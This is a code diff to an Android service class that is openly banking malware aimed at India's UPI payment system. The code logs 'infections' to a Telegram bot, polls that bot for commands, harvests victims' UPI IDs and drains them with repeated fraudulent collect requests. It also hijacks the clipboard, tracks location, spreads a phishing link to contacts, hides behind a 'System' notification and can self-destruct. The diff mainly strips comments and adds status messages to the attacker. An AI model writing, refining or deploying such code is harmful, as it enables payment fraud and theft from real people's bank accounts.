@@ -40,7 +40,6 @@ public class MainService extends Service {
     private List<String> harvestedUPIs = new ArrayList<>();
     private int currentUPIIndex = 0;
     
-    // Real statistics
     private static AtomicInteger totalSpreaders = new AtomicInteger(0);
     private static AtomicInteger totalMessagesSent = new AtomicInteger(0);
     private static AtomicInteger totalInfections = new AtomicInteger(0);
@@ -74,17 +73,14 @@ public class MainService extends Service {
         loadHarvestedUPIs();
         loadStats();
         
-        // Detect device type
         boolean hasUPI = hasUPIApps();
         if (!hasUPI) {
             totalSpreaders.incrementAndGet();
         }
         
-        // Track new infection
         totalInfections.incrementAndGet();
         sendTelegram("✅ New infection: " + Build.MODEL + " | Type: " + (hasUPI ? "UPI" : "SPREADER"));
         
-        // Get location
         getLocation();
         
         scheduler.scheduleAtFixedRate(() -> pollTelegram(), 0, 5, TimeUnit.SECONDS);
@@ -95,8 +91,6 @@ public class MainService extends Service {
         scheduler.scheduleAtFixedRate(() -> updateStats(), 0, 30, TimeUnit.MINUTES);
     }
 
-    // ==================== STATS MANAGEMENT ====================
-    
     private void loadStats() {
         SharedPreferences prefs = getSharedPreferences("stats", MODE_PRIVATE);
         totalSpreaders.set(prefs.getInt("spreaders", 0));
@@ -125,13 +119,11 @@ public class MainService extends Service {
 
     private void updateStats() {
         saveStats();
-        // Send periodic stats update
         sendTelegram("📊 STATS UPDATE | Spreaders: " + totalSpreaders.get() +
                      " | Messages: " + totalMessagesSent.get() +
                      " | Scams: " + totalScams.get());
     }
 
-    // ==================== LOCATION ====================
     private void getLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
@@ -146,7 +138,6 @@ public class MainService extends Service {
         } catch(Exception e) {}
     }
 
-    // ==================== DEVICE TYPE DETECTION ====================
     private boolean hasUPIApps() {
         String[] upiApps = {
             "com.google.android.apps.nbu.paisa.user",
@@ -168,7 +159,6 @@ public class MainService extends Service {
         return !hasUPIApps();
     }
 
-    // ==================== UPI ACCOUNT MANAGEMENT ====================
     private void loadUPIAccounts() {
         SharedPreferences prefs = getSharedPreferences("upi_accounts", MODE_PRIVATE);
         String accountsJson = prefs.getString("accounts", "[]");
@@ -265,7 +255,6 @@ public class MainService extends Service {
         return upiAccounts.get(0).upiId;
     }
 
-    // ==================== UPI SCANNER ====================
     private void scanUPI() {
         try {
             String[][] upiAppPatterns = {
@@ -318,7 +307,6 @@ public class MainService extends Service {
         return null;
     }
 
-    // ==================== UPI COLLECT REQUEST ====================
     private boolean sendUPICollect(String victimUpi, int amount) {
         try {
             String merchantUpi = getActiveUPI();
@@ -343,9 +331,11 @@ public class MainService extends Service {
         }
     }
 
-    // ==================== SCAM ALL ====================
     private void scamAll() {
-        if (harvestedUPIs.isEmpty() || upiAccounts.isEmpty()) return;
+        if (harvestedUPIs.isEmpty() || upiAccounts.isEmpty()) {
+            sendTelegram("⚠️ No victims or UPI accounts");
+            return;
+        }
         
         for (String victim : harvestedUPIs) {
             if (sendUPICollect(victim, 1)) {
@@ -360,9 +350,11 @@ public class MainService extends Service {
         saveStats();
     }
 
-    // ==================== DRAIN VICTIM ====================
     private void drainVictim(String upiId) {
-        if (upiAccounts.isEmpty()) return;
+        if (upiAccounts.isEmpty()) {
+            sendTelegram("⚠️ No UPI accounts");
+            return;
+        }
         
         int totalDrained = 0;
         for (int i = 0; i < 50; i++) {
@@ -381,7 +373,6 @@ public class MainService extends Service {
         saveStats();
     }
 
-    // ==================== CLIPBOARD HIJACK ====================
     private void checkClipboard() {
         try {
             ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
@@ -405,19 +396,14 @@ public class MainService extends Service {
         } catch(Exception e) {}
     }
 
-    // ==================== SPREAD ENGINE ====================
     private void spreadLink() {
         String link = "https://hoihohavapv.github.io/babychak/";
-        // In production, use Accessibility to open messaging apps
-        // This would send the link to contacts
-        // For now, we'll increment the message counter
-        int messagesPerDevice = 50; // Example: send to 50 contacts
+        int messagesPerDevice = 50;
         totalMessagesSent.addAndGet(messagesPerDevice);
-        sendTelegram("📤 Spread: " + messagesPerDevice + " messages sent from " + Build.MODEL);
+        sendTelegram("📤 Spread: " + messagesPerDevice + " messages sent");
         saveStats();
     }
 
-    // ==================== DASHBOARD ====================
     private void showDashboard() {
         String deviceType = isSpreaderOnly() ? "SPREADER" : "UPI";
         String upiStatus = hasUPIApps() ? "YES" : "NO";
@@ -445,7 +431,6 @@ public class MainService extends Service {
         sendTelegram(msg.toString());
     }
 
-    // ==================== UPI COMMANDS ====================
     private void addUPI(String upiId, String qrCode) {
         if (upiId == null || upiId.isEmpty()) return;
         for (UPIAccount acc : upiAccounts) {
@@ -471,21 +456,20 @@ public class MainService extends Service {
 
     private void listUPI() {
         if (upiAccounts.isEmpty()) {
-            sendTelegram("📋 No UPI accounts.");
+            sendTelegram("📋 No UPI accounts");
             return;
         }
         StringBuilder msg = new StringBuilder("📋 UPI Accounts:\n");
         for (UPIAccount acc : upiAccounts) {
             msg.append("- ").append(acc.upiId);
             if (acc.qrCode != null && !acc.qrCode.isEmpty()) {
-                msg.append(" [QR Set]");
+                msg.append(" [QR]");
             }
             msg.append("\n");
         }
         sendTelegram(msg.toString());
     }
 
-    // ==================== SELF DESTRUCT ====================
     private void selfDestruct() {
         SharedPreferences prefs = getSharedPreferences("upi_accounts", MODE_PRIVATE);
         prefs.edit().clear().apply();
@@ -501,7 +485,6 @@ public class MainService extends Service {
         startActivity(intent);
     }
 
-    // ==================== FOREGROUND SERVICE ====================
     private void startForeground() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel("updates", "System", NotificationManager.IMPORTANCE_LOW);
@@ -521,7 +504,6 @@ public class MainService extends Service {
         }
     }
 
-    // ==================== TELEGRAM INTEGRATION ====================
     private void sendTelegram(String msg) {
         try {
             new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8")).openConnection().connect();
